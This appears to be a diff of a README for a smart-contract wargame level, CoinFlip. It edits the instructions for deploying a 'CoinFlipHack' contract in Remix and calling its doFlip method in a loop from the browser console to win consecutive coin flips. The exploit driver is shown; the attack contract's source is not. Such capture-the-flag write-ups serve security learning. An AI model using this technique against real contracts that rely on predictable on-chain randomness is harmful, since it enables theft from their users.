@@ -7,36 +7,36 @@ Type in the browser console:
 0
 ```
 
-Deploy a contract with Remix using attached solidity files (interfaces/[ICoinFlip.sol](./ICoinFlip.sol) and contracts/[CoinFlipHack.sol](./CoinFlipHack.sol)).
+Deploy a contract with Remix using attached Solidity files ([interfaces/ICoinFlip.sol](./src/interfaces/ICoinFlip.sol) and [contracts/CoinFlipHack.sol](./src/contracts/CoinFlipHack.sol)).
 
-Copy the ABI from Remix and run the following code in the browser console:
+Copy the ABI and deployed contract address from Remix and run the following code in the browser console:
 
 ```
 var abi = [
-    {
-        "inputs": [],
-        "name": "doFlip",
-        "outputs": [],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            {
-                "internalType": "address",
-                "name": "_coinFlipAddress",
-                "type": "address"
-            }
-        ],
-        "stateMutability": "nonpayable",
-        "type": "constructor"
-    }
+  {
+    "inputs": [],
+    "name": "doFlip",
+    "outputs": [],
+    "stateMutability": "nonpayable",
+    "type": "function"
+  },
+  {
+    "inputs": [
+      {
+        "internalType": "address",
+        "name": "_coinFlipAddress",
+        "type": "address"
+      }
+    ],
+    "stateMutability": "nonpayable",
+    "type": "constructor"
+  }
 ];
 var hackAddress = "*redacted*";
 var hack = new web3.eth.Contract(abi, hackAddress);
 
 for (var i = 0; i < 10; i++) {
-    await hack.methods.doFlip().send({ from: player });
+  await hack.methods.doFlip().send({ from: player });
 }
 ```
 
